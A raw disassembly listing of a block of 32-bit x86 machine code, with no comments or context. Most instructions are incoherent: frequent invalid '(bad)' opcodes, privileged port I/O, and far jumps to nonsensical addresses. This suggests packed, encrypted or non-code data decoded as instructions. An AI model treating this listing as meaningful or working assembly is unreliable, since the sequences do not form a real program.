  416c42:	mov    WORD PTR ds:0x129d2737,fs
  416c48:	mov    bh,0x84
  416c4a:	addr16 mov ecx,0x1d6a884e
  416c50:	push   edi
  416c51:	push   ecx
  416c52:	sub    DWORD PTR [esi-0x6b24a4d0],ecx
  416c58:	shl    bh,1
  416c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c5b:	adc    DWORD PTR [edi],esp
  416c5d:	(bad)  
  416c5e:	outs   dx,DWORD PTR ds:[esi]
  416c5f:	adc    al,0xd5
  416c61:	xchg   esp,eax
  416c62:	cmp    al,0xfe
  416c64:	push   edx
  416c65:	arpl   WORD PTR [esi-0x67],cx
  416c68:	xchg   dl,cl
  416c6a:	add    eax,0x83822045
  416c6f:	pop    esi
  416c70:	mov    bh,0x40
  416c72:	bound  ecx,QWORD PTR [esi+esi*1-0x13e0dbe5]
  416c79:	int    0x3c
  416c7b:	fabs   
  416c7d:	scas   al,BYTE PTR es:[edi]
  416c7e:	stos   BYTE PTR es:[edi],al
  416c7f:	mov    DWORD PTR [ecx+0x1a],esp
  416c82:	push   es
  416c83:	stos   DWORD PTR es:[edi],eax
  416c84:	mul    BYTE PTR [esi]
  416c86:	imul   ebx,eax,0xffffffa4
  416c89:	int3   
  416c8a:	dec    eax
  416c8b:	ret    
  416c8c:	inc    ecx
  416c8d:	repz push cs
  416c8f:	mov    al,ds:0x13d7befb
  416c94:	fs inc ebx
  416c96:	or     al,0xd6
  416c98:	js     0x416ce2
  416c9a:	shr    BYTE PTR [esp+ecx*4],0xff
  416c9e:	jmp    0xafe1f190
  416ca3:	ss ins BYTE PTR es:[edi],dx
  416ca5:	mov    cl,0x6e
  416ca7:	ret    
  416ca8:	scas   al,BYTE PTR es:[edi]
  416ca9:	mov    ebx,0x53a8ed6c
  416cae:	out    dx,eax
  416caf:	loopne 0x416d27
  416cb1:	jmp    0xeeea:0xdb395235
  416cb8:	mov    cl,0xba
  416cba:	xor    BYTE PTR [ecx+0x17],dh
  416cbd:	in     eax,0x72
  416cbf:	(bad)  
  416cc0:	stos   DWORD PTR es:[edi],eax
  416cc1:	sti    
  416cc2:	dec    ecx
  416cc3:	enter  0x84d5,0xf
  416cc7:	repnz out dx,eax
  416cc9:	out    dx,eax
  416cca:	cmp    al,0xe9
  416ccc:	pop    ecx
  416ccd:	and    eax,0x6610de5
  416cd2:	js     0x416ca3
  416cd4:	pusha  
  416cd5:	xchg   DWORD PTR [ebp+0x7a38bdcd],eax
  416cdb:	lods   al,BYTE PTR ds:[esi]
  416cdc:	lock stc 
  416cde:	xlat   BYTE PTR ds:[ebx]
  416cdf:	mov    dl,dl
  416ce1:	sub    esp,DWORD PTR [edx+0x10]
  416ce4:	dec    eax
  416ce5:	xchg   BYTE PTR [ecx],bl
  416ce7:	inc    ecx
  416ce8:	and    eax,0x1be11e6e
  416ced:	imul   edx,DWORD PTR [edi-0x22],0x493259d0
  416cf4:	nop    edx
  416cf7:	xchg   edx,eax
  416cf8:	retf   0xc978
  416cfb:	data16 mov ?,WORD PTR [eax-0x1adb0bc0]
  416d02:	sbb    edi,eax
  416d04:	inc    edi
  416d05:	aaa    
  416d06:	and    ch,ch
  416d08:	cmp    dh,bh
  416d0a:	mov    BYTE PTR [ebx-0x59bed614],bl
  416d10:	fistp  QWORD PTR [ebp+0x3057e607]
  416d16:	add    esp,ebp
  416d18:	retf   0x211c
  416d1b:	add    edx,DWORD PTR [edx+0x46b27b17]
  416d21:	adc    bh,BYTE PTR [ebx]
  416d23:	ja     0x416cb8
  416d25:	jle    0x416d39
  416d27:	retf   0x3f15
  416d2a:	(bad)  
  416d2b:	int    0x5a
  416d2d:	in     eax,0x39
  416d2f:	xor    eax,0x31000b7d
  416d34:	jo     0x416d09
  416d36:	ins    DWORD PTR es:[edi],dx
  416d37:	dec    esp
  416d38:	retf   0x4b4b
  416d3b:	aam    0xb6
  416d3d:	into   
  416d3e:	or     edi,edi
  416d40:	xchg   DWORD PTR [esi-0x59ddf24c],edi
  416d46:	outs   dx,BYTE PTR ds:[esi]
  416d47:	ret    
  416d48:	inc    esi
  416d49:	xchg   DWORD PTR [ebp+0x668e6a50],eax
  416d4f:	jae    0x416d64
  416d51:	cmc    
  416d52:	sub    ah,ah
  416d54:	and    BYTE PTR [eax+0x79e0446f],bh
  416d5a:	test   eax,0x14f176f
  416d5f:	fwait
  416d60:	xchg   esp,eax
  416d61:	xchg   ecx,eax
  416d62:	scas   eax,DWORD PTR es:[edi]
  416d63:	sahf   
  416d64:	adc    al,0x21
  416d66:	sub    DWORD PTR [edx+0x75],edx
  416d69:	lea    eax,[ecx-0x1cdbf4f9]
  416d6f:	jp     0x416d91
  416d71:	pop    ebx
  416d72:	imul   ebp,DWORD PTR [ecx],0xffffff80
  416d75:	mov    esi,ebx
  416d77:	push   esi
  416d78:	ror    ecx,cl
  416d7a:	jne    0x416d6d
  416d7c:	scas   al,BYTE PTR es:[edi]
  416d7d:	lds    ebx,FWORD PTR [ebx]
  416d7f:	inc    esp
  416d80:	cld    
  416d81:	test   dh,0x5d
  416d84:	call   0x417f:0xc15c5643
  416d8b:	xchg   ebx,eax
  416d8c:	aas    
  416d8d:	repz inc ecx
  416d8f:	lock inc ecx
  416d91:	stos   DWORD PTR es:[edi],eax
  416d92:	bound  esp,QWORD PTR [eax+0x75]
  416d95:	and    al,0x98
  416d97:	sbb    cl,BYTE PTR [edx]
  416d99:	pusha  
  416d9a:	scas   al,BYTE PTR es:[edi]
  416d9b:	je     0x416d4f
  416d9d:	fs mov ah,dl
  416da0:	aaa    
  416da1:	(bad)  
  416da2:	adc    eax,edx
  416da4:	mov    bl,BYTE PTR [esi]
  416da6:	and    BYTE PTR [ebp+0xf816d36],bl
  416dac:	inc    esi
  416dad:	dec    eax
  416dae:	inc    edi
  416daf:	test   al,al
  416db1:	mov    dl,BYTE PTR [ebx]
  416db3:	fisub  WORD PTR [edx]
  416db5:	fs pop ebp
  416db7:	retf   
  416db8:	stos   DWORD PTR es:[edi],eax
  416db9:	push   es
  416dba:	pop    edi
  416dbb:	clc    
  416dbc:	jp     0x416e2f
  416dbe:	clc    
  416dbf:	mov    cl,0x9
  416dc1:	xchg   ebp,eax
  416dc2:	push   ebp
  416dc3:	dec    ebp
  416dc4:	dec    edx
  416dc5:	cmp    BYTE PTR [edx-0x20d0be5f],bh
  416dcb:	ins    BYTE PTR es:[edi],dx
  416dcc:	adc    eax,0xee08f1c
  416dd1:	outs   dx,BYTE PTR ds:[esi]
  416dd2:	icebp  
  416dd3:	call   0xe8d8b6e7
  416dd8:	enter  0x28fd,0x40
  416ddc:	fldcw  WORD PTR [esi]
  416dde:	(bad)  
  416ddf:	jle    0x416e3c
  416de1:	sub    ebp,ebx
  416de3:	cmp    BYTE PTR [eax],0x29
  416de6:	xor    ch,BYTE PTR [edi+0x145a7e3]
  416dec:	mov    esi,0xf6beebb1
  416df1:	inc    ecx
  416df2:	xchg   ebx,eax
  416df3:	jge    0x416da3
  416df5:	lea    ecx,[edx+0x51ecc08]
  416dfb:	cmp    cl,0x24
  416dfe:	add    ch,BYTE PTR [eax-0x30]
  416e01:	gs pop ss
  416e03:	mov    ch,0x71
  416e05:	scas   al,BYTE PTR es:[edi]
  416e06:	sbb    eax,DWORD PTR [edi-0x2ac6cc3]
  416e0c:	inc    ebp
  416e0e:	mov    dh,0x46
  416e10:	mov    ebp,0x7f86d443
  416e15:	call   0x29de:0x818d4bdd
  416e1c:	dec    eax
  416e1d:	jne    0x416e00
  416e1f:	popf   
  416e20:	(bad)  
  416e21:	jp     0x416dd9
  416e23:	or     BYTE PTR [ebx-0x6d75b4f5],dl
  416e29:	dec    al
  416e2b:	mov    ch,0x90
  416e2d:	mov    bl,0xd7
  416e2f:	push   0xffffffdd
  416e31:	ret    
  416e32:	aaa    
  416e33:	ror    BYTE PTR [edi],0x74
  416e36:	(bad)  [edx]
  416e38:	cmp    eax,esp
  416e3a:	jmp    0x416e3d
  416e3c:	sti    
  416e3d:	(bad)  
  416e3e:	mov    ds:0x1107d021,al
  416e43:	call   FWORD PTR [edi]
  416e45:	inc    edx
  416e46:	pop    ecx
  416e47:	push   0xffffff94
  416e49:	push   ds
  416e4a:	jne    0x416ea8
  416e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e4d:	ins    DWORD PTR es:[edi],dx
  416e4e:	(bad)  
  416e50:	push   ebx
  416e51:	div    DWORD PTR [ecx+0x2ed81bdd]
  416e57:	ins    DWORD PTR es:[edi],dx
  416e58:	dec    edi
  416e59:	push   edi
  416e5a:	or     al,0x1b
  416e5c:	pop    ss
  416e5d:	test   DWORD PTR [ecx-0x7d28078d],esi
  416e63:	fst    QWORD PTR [ebx+eax*8-0x306b665]
  416e6a:	dec    ebx
  416e6b:	push   0xffffffb1
  416e6d:	nop
  416e6e:	cli    
  416e6f:	test   DWORD PTR ss:0x3d8ccf26,eax
  416e76:	inc    ecx
  416e77:	lea    eax,[ecx]
  416e79:	mov    al,ds:0x6203691a
  416e7e:	mov    ch,BYTE PTR [edi+0x4b42c440]
  416e84:	sbb    eax,0x84f356ca
  416e89:	pushf  
  416e8a:	push   ebp
  416e8b:	jge    0x416f03
  416e8d:	(bad)  
  416e8e:	shl    BYTE PTR [esi-0x235dcd97],cl
  416e94:	lods   eax,DWORD PTR ds:[esi]
  416e95:	ins    DWORD PTR es:[edi],dx
  416e96:	leave  
  416e97:	inc    esi
  416e98:	jb     0x416ecd
  416e9a:	sbb    bh,bl
  416e9c:	shl    DWORD PTR [edx],cl
  416e9e:	push   ss
  416e9f:	js     0x416e95
  416ea1:	xchg   edx,eax
  416ea2:	dec    eax
  416ea3:	outs   dx,DWORD PTR ss:[esi]
  416ea5:	xor    DWORD PTR [eax],edi
  416ea7:	outs   dx,DWORD PTR ds:[esi]
  416ea8:	add    edx,DWORD PTR [eax-0x209787bb]
  416eae:	idiv   BYTE PTR [ebx+0x73]
  416eb1:	mov    ecx,0xdb42c7e5
  416eb6:	jmp    0x8b95:0x3c6fdc9
  416ebd:	or     edx,eax
  416ebf:	mov    eax,0xb86d5476
  416ec4:	pop    ds
  416ec5:	dec    edi
  416ec6:	and    eax,0xb8c3a2ee
  416ecb:	test   BYTE PTR [edx+0x4af1a23d],cl
  416ed1:	lea    ebx,[ecx+0x55]
  416ed4:	(bad)  
  416ed5:	popa   
  416ed6:	cmp    BYTE PTR [esi],dl
  416ed8:	cld    
  416ed9:	mov    ebp,0x824af3e7
  416ede:	ror    dh,cl
  416ee0:	shr    DWORD PTR [ecx+0x31],cl
  416ee3:	call   0xe3ae:0xd853b8f8
  416eea:	pop    edi
  416eeb:	add    BYTE PTR [edi+0x22],bl
  416eee:	sahf   
  416eef:	sub    eax,0x1b4dd6df
  416ef4:	sbb    DWORD PTR [edx+0xa4c1764],0xffffffb8
  416efb:	xchg   dl,bl
  416efd:	(bad)  
  416efe:	in     eax,0xd0
  416f00:	pushf  
  416f01:	loope  0x416ed4
  416f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f04:	lods   al,BYTE PTR ds:[esi]
  416f05:	ins    BYTE PTR es:[edi],dx
  416f06:	push   esp
  416f07:	sahf   
  416f08:	mov    bh,0x88
  416f0a:	sti    
  416f0b:	shr    DWORD PTR [ebp-0xf],0xb9
  416f0f:	or     esp,DWORD PTR [ebx+0x6c]
  416f12:	jae    0x416f25
  416f14:	ss sbb ch,bl
  416f17:	or     eax,0xef9fe697
  416f1c:	nop    DWORD PTR [edx]
  416f1f:	push   esi
  416f20:	(bad)  
  416f21:	and    ebx,DWORD PTR [ebx-0x3547412c]
  416f27:	pusha  
  416f28:	fld    QWORD PTR [edx-0x3d8b3dd5]
  416f2e:	scas   al,BYTE PTR es:[edi]
  416f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f30:	or     al,0x2a
  416f32:	xchg   esp,eax
  416f33:	ins    BYTE PTR es:[edi],dx
  416f34:	les    ebp,FWORD PTR [esi]
  416f36:	popa   
  416f37:	and    BYTE PTR [ebp+ecx*4+0x4f30586e],cl
  416f3e:	out    0xa4,eax
  416f40:	jl     0x416ef7
  416f42:	cdq    
  416f43:	enter  0x3a30,0xa7
  416f47:	and    DWORD PTR ds:0x1f13d757,ecx
  416f4d:	push   edi
  416f4e:	cmp    ah,0x9e
  416f51:	cli    
  416f52:	dec    eax
  416f53:	and    BYTE PTR [ecx+eax*4-0x6d385c21],dh
  416f5a:	mov    ebp,DWORD PTR [edi-0x4482cd93]
  416f60:	mov    dl,0x3
  416f62:	fnsave [ecx-0x53b6d09a]
  416f68:	(bad)  
  416f69:	jg     0x416ef1
  416f6b:	push   esp
  416f6c:	mov    edx,0x78030d13
  416f71:	mov    ds:0x9a164d33,al
  416f76:	cdq    
  416f77:	out    dx,eax
  416f78:	fs jne 0x416f85
  416f7b:	mov    esi,0xe3c8e4aa
  416f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f81:	rcr    BYTE PTR [ebx],0xda
  416f84:	sbb    ch,BYTE PTR [eax-0x20]
  416f87:	xchg   edx,eax
  416f88:	jg     0x416f2a
  416f8a:	xchg   edi,eax
  416f8b:	imul   esi,DWORD PTR [eax],0x87364951
  416f91:	add    dl,0x14
  416f94:	jnp    0x416f90
  416f96:	mov    esi,0x3d5d4031
  416f9b:	call   0x80a0:0x4636f68f
  416fa2:	and    eax,0xe1052fee
  416fa7:	dec    ebp
  416fa8:	ja     0x416f6e
  416faa:	repz ss pop eax
  416fad:	mov    edi,0xc7502f1d
  416fb2:	push   ss
  416fb3:	out    0x74,eax
  416fb5:	xchg   edi,eax
  416fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb7:	aaa    
  416fb8:	cwde   
  416fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fba:	aad    0x64
  416fbc:	push   edx
  416fbd:	hlt    
  416fbe:	jbe    0x416f61
  416fc0:	sbb    BYTE PTR [ecx-0x74c7af0d],ah
  416fc6:	in     al,dx
  416fc7:	adc    ch,BYTE PTR [edx]
  416fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fca:	pop    eax
  416fcb:	test   BYTE PTR [eax+0xf],ah
  416fce:	out    dx,al
  416fcf:	ss repz cmp esi,edi
  416fd3:	aad    0x2e
  416fd5:	cdq    
  416fd6:	(bad)  
  416fd7:	pop    esi
  416fd8:	loopne 0x416fa4
  416fda:	mov    bl,0xd1
  416fdc:	mov    bh,0xec
  416fde:	push   0x436c97b9
  416fe3:	outs   dx,BYTE PTR ds:[esi]
  416fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fe5:	dec    BYTE PTR [ebx]
  416fe7:	push   edx
  416fe8:	mov    eax,0x9354d155
  416fed:	inc    ebx
  416fee:	dec    edx
  416fef:	xchg   edx,eax
  416ff0:	xor    al,0x58
  416ff2:	xchg   BYTE PTR [edi-0x37a98162],al
  416ff8:	inc    esi
  416ff9:	mov    ah,0x3b
  416ffb:	mov    eax,DWORD PTR ds:0x98e27020
  417001:	and    al,0x69
  417003:	fimul  DWORD PTR [edx+0x32725872]
  417009:	fmul   QWORD PTR [edx-0x3b]
  41700c:	push   0x5ed1fd5d
  417011:	sub    eax,DWORD PTR [edi+edx*2-0x19d93736]
  417018:	push   ebx
  417019:	and    cl,BYTE PTR [esi]
  41701b:	jmp    0x41702e
  41701d:	in     eax,dx
  41701e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41701f:	cmp    al,0xd1
  417021:	mov    ?,WORD PTR [esi]
  417023:	js     0x4170a0
  417025:	push   0x17
  417027:	test   al,0xfe
  417029:	scas   eax,DWORD PTR es:[edi]
  41702a:	or     DWORD PTR [edi],0x81f453e8
  417030:	pop    esp
  417031:	and    DWORD PTR [ebx+ecx*1-0x60],0x40
  417036:	push   ebx
  417037:	outs   dx,DWORD PTR ds:[esi]
  417038:	mov    dh,0xd1
  41703a:	iret   
  41703b:	rol    dl,1
  41703d:	sti    
  41703e:	jmp    0xc1020c9a
  417043:	(bad)  
  417044:	xlat   BYTE PTR ds:[ebx]
  417045:	jno    0x417005
  417047:	xchg   edx,eax
  417048:	add    esp,0x38
  41704b:	fs fst st(6)
  41704e:	nop
  41704f:	out    0xd1,eax
  417051:	lods   eax,DWORD PTR ds:[esi]
  417052:	cmp    DWORD PTR [edx+0xe9d4219],edx
  417058:	ret    0xe8b1
  41705b:	mov    bl,0x9b
  41705d:	add    eax,0x4fb5482b
  417062:	icebp  
  417063:	cli    
  417064:	pop    eax
  417065:	and    al,0x70
  417067:	add    DWORD PTR [ebx],eax
  417069:	nop
  41706a:	xchg   ebp,eax
  41706b:	dec    ebp
  41706d:	mov    edx,0xa2cd82a6
  417072:	adc    eax,0x9b51e3de
  417077:	jmp    0x4170d2
  417079:	lds    esp,FWORD PTR ds:[edx+eiz*4-0x18b99499]
  417081:	mov    BYTE PTR [edi],ch
  417083:	and    ebp,DWORD PTR [eax]
  417085:	hlt    
  417086:	xor    eax,0x813e60e1
  41708b:	fdivrp st(0),st
  41708d:	lock out dx,eax
  41708f:	mov    ebx,0x6d3fb6db
  417094:	mov    al,0x8b
  417096:	imul   eax,DWORD PTR [edi],0xc97ac6d2
  41709c:	enter  0xa4f9,0xe9
  4170a0:	sub    DWORD PTR [edi-0x5468e73b],edx
  4170a6:	xor    ecx,ecx
  4170a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170a9:	dec    esp
  4170aa:	push   ecx
  4170ab:	push   es
  4170ac:	sahf   
  4170ad:	test   bl,cl
  4170af:	and    ch,al
  4170b1:	mov    al,ds:0xfb8b9a6f
  4170b6:	and    eax,0x1223d167
  4170bb:	es or  dl,dl
  4170be:	jp     0x417123
  4170c0:	or     DWORD PTR [eax],eax
  4170c2:	dec    edx
  4170c3:	shl    BYTE PTR [esi+eiz*1+0x30ecad8],cl
  4170ca:	mov    dh,0x12
  4170cc:	jo     0x4170ba
  4170ce:	dec    esp
  4170cf:	jl     0x417075
  4170d1:	ret    
  4170d2:	ret    0x2b4e
  4170d5:	xchg   ecx,eax
  4170d6:	nop
  4170d7:	sub    BYTE PTR [esi+0x51],ch
  4170da:	jmp    0x5d9e:0x912754d0
  4170e1:	pop    edx
  4170e2:	xchg   ebx,eax
  4170e3:	call   0xcfe37473
  4170e8:	dec    ebp
  4170e9:	das    
  4170ea:	fst    DWORD PTR [edi-0x4dbedf61]
  4170f0:	mov    edi,DWORD PTR [ebx]
  4170f2:	and    dl,BYTE PTR [ebx]
  4170f4:	fldenv [ebp+0x7c3971b5]
  4170fa:	jp     0x417139
  4170fc:	jae    0x417091
  4170fe:	int    0x5
  417100:	mov    al,ds:0x7be7768a
  417105:	sbb    BYTE PTR [edx+0x1f9ec86c],ch
  41710b:	push   ebx
  41710c:	inc    ebp
  41710d:	fwait
  41710e:	inc    esi
  41710f:	pop    edx
  417110:	xor    bh,al
  417112:	and    dh,ch
  417114:	adc    dh,bl
  417116:	imul   esp,ecx,0x0
  417119:	xchg   esi,eax
  41711a:	outs   dx,DWORD PTR ds:[esi]
  41711b:	cmp    eax,0xd5557280
  417120:	xor    esp,eax
  417122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417123:	mov    WORD PTR [edi-0x19],gs
  417126:	mov    al,0x9b
  417128:	and    eax,0x536e59ee
  41712d:	test   eax,0x636de008
  417132:	cmp    eax,0xb47a1e70
  417137:	scas   al,BYTE PTR es:[edi]
  417138:	or     cl,al
  41713a:	xchg   BYTE PTR [edi+0x66],ah
  41713d:	mov    ebx,0x1082b018
  417142:	jg     0x417117
  417144:	push   ecx
  417145:	and    al,0xe0
  417147:	xchg   esp,eax
  417148:	add    ch,bh
  41714a:	push   ebp
  41714b:	push   ss
  41714c:	neg    BYTE PTR [ecx+0x37a85403]
  417152:	sbb    ecx,0x40
  417155:	and    ebp,DWORD PTR [esi+0x772d2984]
  41715b:	jge    0x4171c6
  41715d:	sub    bh,dh
  41715f:	mov    ebx,0xb15d1a81
  417164:	sub    BYTE PTR [ecx],bl
  417166:	imul   esp,ecx,0x956ffeb
  41716c:	adc    BYTE PTR [ecx+0x559d3ca0],al
  417172:	inc    esi
  417173:	adc    ah,BYTE PTR [edi]
  417175:	jmp    0x4766:0x47127dc0
  41717c:	fistp  DWORD PTR [esi]
  41717e:	mov    cl,BYTE PTR [edx+ebp*8-0x6e56c81d]
  417185:	cdq    
  417186:	cld    
  417187:	gs xor al,0x45
  41718a:	into   
  41718b:	mov    al,0x68
  41718d:	mov    bh,0x40
  41718f:	jae    0x41711d
  417191:	sbb    al,0x19
  417193:	out    0x32,eax
  417195:	out    0x9f,al
  417197:	jmp    0xad086f82
  41719c:	jle    0x4171e8
  41719e:	and    ebx,DWORD PTR [ebp+0x7bad0516]
  4171a4:	add    bl,BYTE PTR [edx+0x6a]
  4171a7:	jle    0x417174
  4171a9:	and    BYTE PTR [ebx],0x50
  4171ac:	push   cs
  4171ad:	in     eax,dx
  4171ae:	add    DWORD PTR [edx-0x7ab6dde2],ebx
  4171b4:	fs (bad) 
  4171b6:	daa    
  4171b7:	pop    esp
  4171b8:	pop    ebp
  4171b9:	ss cwde 
  4171bb:	or     eax,0x27bcd8ea
  4171c0:	(bad)
  4171c3:	adc    DWORD PTR [ecx+0x232d68ed],ebx
  4171c9:	adc    eax,eax
  4171cb:	and    eax,DWORD PTR cs:[edx]
  4171ce:	add    al,0xd
  4171d0:	call   0xe72a4f3
  4171d5:	sub    eax,0x8096b069
  4171da:	lods   al,BYTE PTR ds:[esi]
  4171db:	lds    eax,FWORD PTR [edi-0x360d38af]
  4171e1:	dec    eax
  4171e2:	dec    edx
  4171e3:	pop    es
  4171e4:	xchg   ebx,eax
  4171e5:	inc    ebx
  4171e6:	jns    0x4171da
  4171e8:	out    0x6a,eax
  4171ea:	mov    edx,0xd877dc4d
  4171ef:	mov    esp,0xacb46aec
  4171f4:	aam    0x6d
  4171f6:	add    al,0xdb
  4171f8:	mov    dh,0xc4
  4171fa:	sub    al,0x58
  4171fc:	aas    
  4171fd:	(bad)  
  4171fe:	lods   eax,DWORD PTR ds:[esi]
  4171ff:	dec    ebx
  417200:	xchg   ebx,eax
  417201:	dec    ecx
  417202:	push   ebp
  417203:	jmp    0x417225
  417205:	jecxz  0x4171e2
  417207:	int    0xff
  417209:	jecxz  0x41722f
  41720b:	mov    ch,0xee
  41720d:	dec    ecx
  41720e:	repz kxnorb k4,k4,k0
  417213:	popf   
  417214:	out    0x1c,al
  417216:	out    0xdd,al
  417218:	not    BYTE PTR [edi]
  41721a:	jl     0x41719c
  41721c:	data16 in al,0x90
  41721f:	xor    BYTE PTR [ebp+0x38550f43],0x89
  417226:	jno    0x41728f
  417228:	icebp  
  417229:	sub    ecx,DWORD PTR [esi+0x3833cfe6]
  41722f:	pop    ss
  417230:	cs jb  0x4172ab
  417233:	adc    al,0xf4
  417235:	jne    0x417291
  417237:	aas    
  417238:	jne    0x41724d
  41723a:	mov    al,0x2a
  41723c:	iret   
  41723d:	sub    ch,ch
  41723f:	adc    esp,edi
  417241:	adc    eax,0x9b93cf18
  417246:	out    0x6c,eax
  417248:	add    DWORD PTR [ecx-0x48],eax
  41724b:	(bad)  [ebx]
  41724d:	pop    DWORD PTR [ebx]
  41724f:	fdiv   QWORD PTR [esi+0x77]
  417252:	jmp    0x9ce6:0x389f3640
  417259:	mov    edi,0x386b4cc3
  41725e:	dec    esp
  41725f:	pop    ss
  417260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417261:	push   ebp
  417263:	cmp    DWORD PTR cs:[ecx-0x44],0x49
  417268:	sub    ah,BYTE PTR [edx+esi*2+0x3a]
  41726c:	das    
  41726d:	jne    0x417227
  41726f:	xchg   esp,eax
  417270:	inc    ecx
  417271:	xchg   DWORD PTR [ebx-0x3bbc7972],edi
  417277:	sti    
  417278:	jae    0x417285
  41727a:	ret    
  41727b:	mov    ebx,0xcd144138
  417280:	lods   eax,DWORD PTR ds:[esi]
  417281:	xchg   ebp,eax
  417282:	mov    ecx,0xcf39ebe
  417287:	lock out 0xef,eax
  41728a:	pop    edi
  41728b:	xor    al,0x81
  41728d:	pop    edx
  41728e:	sub    BYTE PTR [eax],bl
  417290:	mov    al,ds:0x157d5ff2
  417295:	mov    eax,ds:0x515eef64
  41729a:	jb     0x417226
  41729c:	or     eax,0xf694258
  4172a1:	sbb    eax,0xb64c1e9c
  4172a6:	into   
  4172a7:	lods   al,BYTE PTR ds:[esi]
  4172a8:	in     eax,0x89
  4172aa:	mov    al,0x3f
  4172ac:	inc    esi
  4172ad:	repz ja 0x41724a
  4172b0:	cmp    BYTE PTR [eax],ch
  4172b2:	jo     0x41729a
  4172b4:	and    cl,bh
  4172b6:	fwait
  4172b7:	inc    ebp
  4172b8:	jb     0x41730c
  4172ba:	stos   BYTE PTR es:[edi],al
  4172bb:	sub    dl,BYTE PTR [ebx+esi*4]
  4172be:	stos   DWORD PTR es:[edi],eax
  4172bf:	icebp  
  4172c0:	inc    edi
  4172c1:	mov    edi,0xd30adc75
  4172c6:	js     0x41732d
  4172c8:	pop    esp
  4172c9:	ins    DWORD PTR es:[edi],dx
  4172ca:	je     0x4172ef
  4172cc:	mov    dh,0xc
  4172ce:	dec    esp
  4172cf:	outs   dx,BYTE PTR ds:[esi]
  4172d0:	test   al,0xca
  4172d2:	sub    eax,0xb54eff46
  4172d7:	fild   QWORD PTR ss:[esi]
  4172da:	imul   ebp,DWORD PTR [ebx*4-0x14ffda32],0xffffffac
  4172e2:	retf   0x572b
  4172e5:	add    al,0xd2
  4172e7:	stos   BYTE PTR es:[edi],al
  4172e8:	in     eax,dx
  4172e9:	fwait
  4172ea:	lods   eax,DWORD PTR ds:[esi]
  4172eb:	pop    edx
  4172ec:	daa    
  4172ed:	xchg   edi,eax
  4172ee:	dec    eax
  4172ef:	lods   al,BYTE PTR ds:[esi]
  4172f0:	test   DWORD PTR [eax],0xa64c7b10
  4172f6:	das    
  4172f7:	fld    TBYTE PTR [eax]
  4172f9:	mov    edx,0x21f2c8c0
  4172fe:	nop
  4172ff:	sub    al,0x87
  417301:	scas   al,BYTE PTR es:[edi]
  417302:	test   BYTE PTR [eax-0x216ae4a5],bl
  417308:	pop    edx
  417309:	xchg   esp,eax
  41730a:	out    0x75,eax
  41730c:	inc    ecx
  41730d:	sub    ecx,DWORD PTR [edi-0x44]
  417310:	loopne 0x4172c5
  417312:	js     0x417335
  417314:	mov    cl,0x5d
  417316:	adc    BYTE PTR [ebp-0x4c],bl
  417319:	js     0x417357
  41731b:	fcomp  QWORD PTR [ecx-0x13900396]
  417321:	cmp    eax,0xffddc94
  417326:	sbb    eax,eax
  417328:	shr    bl,1
  41732a:	adc    BYTE PTR [ecx],ah
  41732c:	mov    ds:0x73a695fd,eax
  417331:	loopne 0x41735a
  417333:	ins    DWORD PTR es:[edi],dx
  417334:	loopne 0x417305
  417336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417337:	(bad)  
  417338:	cmc    
  417339:	jmp    0x8e22ae74
  41733e:	cmp    BYTE PTR [ecx+eax*1-0x5a],0x5c
  417343:	shl    ebp,cl
  417345:	mov    esi,DWORD PTR [ebx-0x5a]
  417348:	iret   
  417349:	(bad)
  41734c:	xor    eax,0x9c2cbad4
  417351:	and    esp,edx
  417353:	inc    BYTE PTR [ebx]
  417355:	pop    es
  417356:	jg     0x4172f7
  417358:	test   DWORD PTR ss:[edx+0x3b],0x1eae8bbe
  417360:	pop    edi
  417361:	dec    edi
  417362:	imul   BYTE PTR [ebx-0x1a]
  417365:	and    BYTE PTR [ebp-0x79d4ccc8],0xdd
  41736c:	in     eax,dx
  41736d:	fisub  DWORD PTR [ebx]
  41736f:	pop    ebp
  417370:	mov    eax,ds:0x12c432f4
  417375:	fidivr DWORD PTR [edi+0x1]
  417378:	retf   
  417379:	cwde   
  41737a:	lock retf 0x834c
  41737e:	fldcw  WORD PTR [edi]
  417380:	test   eax,0x32bd81bd
  417385:	jmp    0xc33e72e2
  41738a:	in     eax,0x22
  41738c:	sub    dl,bh
  41738e:	lock cld 
  417390:	jne    0x417340
  417392:	in     eax,dx
  417393:	jns    0x4173bd
  417395:	mov    bh,0x81
  417397:	out    dx,al
  417398:	lods   eax,DWORD PTR ds:[esi]
  417399:	xor    dh,BYTE PTR [edx-0x72]
  41739c:	es jnp 0x4173dd
  41739f:	add    eax,0xcb0a9942
  4173a4:	stc    
  4173a5:	pop    edx
  4173a6:	xchg   ebp,eax
  4173a7:	xor    al,al
  4173a9:	rcr    BYTE PTR [eax+0x79],cl
  4173ac:	sti    
  4173ad:	and    al,0x9
  4173af:	sar    ebp,cl
  4173b1:	pop    es
  4173b2:	jmp    0x913bd47f
  4173b7:	retf   0x64a9
  4173ba:	in     al,dx
  4173bb:	mov    ebx,0x957e62ef
  4173c0:	sub    al,0xdd
  4173c2:	or     dh,BYTE PTR [esi-0x400c47ad]
  4173c8:	inc    esi
  4173c9:	mov    tr6,edx
  4173cc:	nop
  4173cd:	jmp    0x417436
  4173cf:	leave  
  4173d0:	and    eax,0x9d64b4ec
  4173d5:	out    0xf7,eax
  4173d7:	fistp  WORD PTR [edx]
  4173d9:	dec    eax
  4173da:	adc    esp,DWORD PTR [esi+edx*1+0x2a820450]
  4173e1:	mov    DWORD PTR [edx-0x75],ebp
  4173e4:	sub    al,0xbe
  4173e6:	call   0xe1ddded9
  4173eb:	loop   0x417381
  4173ed:	call   0xf97d:0x28fdd3ee
  4173f4:	pop    es
  4173f5:	add    eax,0xaeb6a616
  4173fa:	fld    QWORD PTR [eax]
  4173fc:	dec    ebx
